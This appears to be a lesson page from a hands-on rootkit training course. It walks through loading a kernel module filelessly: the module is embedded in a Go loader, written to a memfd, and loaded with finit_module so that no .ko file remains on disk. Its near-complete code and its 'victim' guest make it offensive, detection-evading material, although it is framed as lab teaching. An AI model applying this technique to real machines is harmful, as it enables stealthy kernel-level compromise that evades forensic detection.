# L20: Fileless Module Loading

L19 transferred files over TLS, but the `.ko` landed on disk.
This exercise embeds the module in the agent, places its bytes in a
memory-backed file, and asks the kernel to load it from that descriptor.

## What you will observe

The module becomes active without a `rklings.ko` directory entry:

```console
root@victim:~# grep '^rklings ' /proc/modules
rklings 16384 0 - Live 0x0000000000000000
root@victim:~# find / -name rklings.ko 2>/dev/null
```

The empty `find` result is the point.
The kernel received the same module bytes as before, but those bytes never
occupied a named file in the guest.

## Workspace

```text
exercises/L20-fileless-module
├── go.mod
├── go.sum
└── main.go
```

Complete the TODOs in `main.go`.
The build embeds the reference module in the loader as `rklings.ko`; you
implement the path from those embedded bytes to the kernel.

## Follow the bytes into the kernel

Linux provides two primitives that, combined, let you load a kernel module
without any file on disk:

```text
+-----------------------------+
| loader executable           |
|   embedded rklings.ko bytes |
+--------------+--------------+
               | memfd_create
               v
+-----------------------------+
| anonymous RAM-backed file   |
|   write all module bytes    |
+--------------+--------------+
               | finit_module(fd, "", 0)
               v
+-----------------------------+
| running kernel              |
|   rklings module loaded     |
+-----------------------------+
```

`memfd_create` creates an anonymous file backed by RAM.
It appears under `/proc/self/fd/` while open but has no directory entry
anywhere.
The `MFD_CLOEXEC` flag ensures the fd is closed automatically if the process
execs another binary.

`finit_module` is the fd-based variant of `init_module`.
Where `init_module` takes a pointer to the module bytes in userspace memory,
`finit_module` takes a file descriptor.
The kernel reads the ELF from the fd, verifies it, and loads it.
Same result as `insmod`, but the source can be a memfd with no filesystem path.

## Implement it

Complete `main.go`:

- Read embedded `.ko` bytes (`go:embed` is already configured)
- Create a memfd with `unix.MemfdCreate` and `MFD_CLOEXEC`
- Write all `.ko` bytes to the memfd, handling short writes
- Call `unix.FinitModule` to load the module from the fd
- Close the fd

## Use the file descriptor APIs

```go
import "golang.org/x/sys/unix"

// Create anonymous memory-backed fd.
// Name is for debugging only (visible in /proc/pid/fd/).
// MFD_CLOEXEC marks the fd close-on-exec.
fd, err := unix.MemfdCreate("", unix.MFD_CLOEXEC)

// Write bytes to the fd. Standard unix.Write.
n, err := unix.Write(fd, koBytes)

// Load module from fd. params="" for no parameters, flags=0.
err = unix.FinitModule(fd, "", 0)

// Close the fd.
unix.Close(fd)
```

```go
import _ "embed"

//go:embed rklings.ko
var koBytes []byte
```

## Test it

```sh
./rklings run L20
```

`run` stages the loader, executes it once, and leaves the guest open for
inspection:

```text
root@victim:~# lsmod | grep rklings
rklings                16384  0
root@victim:~# find / -name 'rklings.ko' 2>/dev/null
(no output)
```

The module shows in `lsmod`, but no `.ko` file exists in a filesystem directory.
The loader closes the memfd before it exits, so no open descriptor remains.

## Validate

```sh
./rklings validate L20
  [+] rklings module is loaded
  [+] no rklings.ko file on disk
  [+] module loaded via memfd (no file path)
  PASS
```

## Next

The module loads without leaving a `.ko` in a directory, but the launcher still
remains on disk.
L21 removes that launcher after startup while keeping the agent running.
